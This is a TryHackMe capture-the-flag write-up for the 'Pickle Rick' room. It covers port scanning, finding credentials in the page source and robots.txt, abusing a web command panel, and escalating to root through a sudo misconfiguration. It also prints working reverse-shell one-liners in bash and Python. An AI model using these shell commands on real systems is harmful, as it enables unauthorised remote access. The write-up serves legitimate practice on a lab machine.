# 🥒 Pickle Rick — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF / Web Exploitation
**Tags:** `nmap` `gobuster` `command-injection` `web-shell` `privilege-escalation` `linux`

---

## Overview

A Rick and Morty themed room where Rick has turned himself into a pickle and needs your help finding three secret ingredients to turn himself back. The challenge involves basic web enumeration, discovering credentials hidden in plain sight, exploiting a command execution panel, and escalating to root. A great room for practicing the fundamentals of web-based exploitation.

---

## Reconnaissance

### Nmap — Port Scanning

```bash
nmap -sV -sC -oN nmap_pickle.txt <TARGET_IP>
```

**Flags explained:**
- `-sV` — Service/version detection
- `-sC` — Default script scan
- `-oN` — Normal output saved to file

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

Two open ports — SSH and HTTP. Start with HTTP.

---

## Web Enumeration

### Page Source Inspection

Navigate to `http://<TARGET_IP>` and immediately **view the page source** (Ctrl+U).

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

A username is sitting in the HTML comment. Always read the source before running tools.

### Robots.txt

```bash
curl http://<TARGET_IP>/robots.txt
```

**Output:**
```
Wubbalubbadubdub
```

This is the password. It's hiding in `robots.txt` — one of the first files to always check.

### Directory Brute-Forcing with Gobuster

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -o gobuster_pickle.txt
```

**Flags explained:**
- `-x php,txt,html` — Test these extensions
- `-t 50` — 50 concurrent threads for speed

**Key findings:**
```
/login.php        (Status: 200)
/portal.php       (Status: 302)
/assets/          (Status: 301)
/clue.txt         (Status: 200)
```

---

## Initial Access — Web Login

Navigate to `/login.php` and log in with the discovered credentials:

```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

You're redirected to a **command panel** at `/portal.php` — a web interface that executes Linux commands directly on the server.

---

## Command Execution & Flag Hunting

### Testing Command Execution

```bash
whoami
```
Output: `www-data`

```bash
ls -la
```

Lists files in the web root. You'll see `Sup3rS3cretPickl3Ingred.txt`.

### First Ingredient (Flag 1)

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

Note: `cat` may be disabled. If so, use alternatives:

```bash
less Sup3rS3cretPickl3Ingred.txt
# or
strings Sup3rS3cretPickl3Ingred.txt
# or
while read line; do echo $line; done < Sup3rS3cretPickl3Ingred.txt
```

First ingredient captured. ✅

### Second Ingredient (Flag 2)

Explore the file system:

```bash
ls /home
ls /home/rick
```

Found: `second ingredients`

```bash
less "/home/rick/second ingredients"
```

(Note the space in the filename — wrap in quotes)

Second ingredient captured. ✅

### Establishing a Reverse Shell (Optional but Good Practice)

Set up a listener on your machine:

```bash
nc -lvnp 4444
```

**Flags explained:**
- `-l` — Listen mode
- `-v` — Verbose
- `-n` — No DNS resolution
- `-p` — Port number

Send a reverse shell from the command panel:

```bash
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```

Or use Python:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## Privilege Escalation

### Checking Sudo Permissions

```bash
sudo -l
```

**Output:**
```
User www-data may run the following commands on ip-xxx:
    (ALL) NOPASSWD: ALL
```

`www-data` can run **everything** as root with no password. This is a severe misconfiguration.

### Escalating to Root

```bash
sudo bash
```

Or:

```bash
sudo su
```

You now have a root shell.

### Third Ingredient (Flag 3)

```bash
ls /root
cat /root/3rd.txt
```

Third ingredient captured. ✅

---

## Summary

| Step | Technique | Tool / Method |
|------|-----------|---------------|
| Reconnaissance | Port scanning | Nmap |
| Credential discovery | Page source + robots.txt | Browser / curl |
| Web enumeration | Directory brute-force | Gobuster |
| Initial access | Web login + command panel | Browser |
| Flag hunting | Command execution / file traversal | Web shell |
| Privilege escalation | Sudo ALL misconfiguration | sudo bash |

---

## Key Takeaways

- **Always check page source and robots.txt before running any tools** — credentials are often hiding in plain sight
- `cat` being disabled is a common CTF trick; always have alternative file-reading commands ready
- `sudo -l` is a critical first step after gaining any shell access
- Web-based command panels are essentially unauthenticated RCE if not properly secured
- Even `www-data` (a low-privilege web user) can be a path to root if sudo is misconfigured

---

*Room link: https://tryhackme.com/room/picklerick*
